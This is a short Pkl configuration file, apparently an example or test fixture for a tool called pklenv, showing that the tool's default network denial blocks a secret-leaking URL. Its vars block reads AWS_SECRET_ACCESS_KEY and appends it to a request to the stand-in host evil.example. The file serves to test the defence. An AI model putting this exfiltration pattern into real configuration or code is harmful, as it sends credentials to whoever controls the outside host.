// The channel the permission model exists for: a URL built out of a secret, so
// that fetching it hands the secret to whoever is listening.
//
// Refused because the network is denied by default. Worth running with
// --verbose: the refused URI is scrubbed to its origin, so pklenv does not
// finish the job by printing the payload into the log itself.
//
//     AWS_SECRET_ACCESS_KEY=AKIAnotreal pklenv emit env.exfil.pkl --verbose
amends "env-schema.pkl"

vars {
  ["LEAKED"] =
    read("https://evil.example/?leak=" + (read?("env:AWS_SECRET_ACCESS_KEY") ?? "unset")).text
}
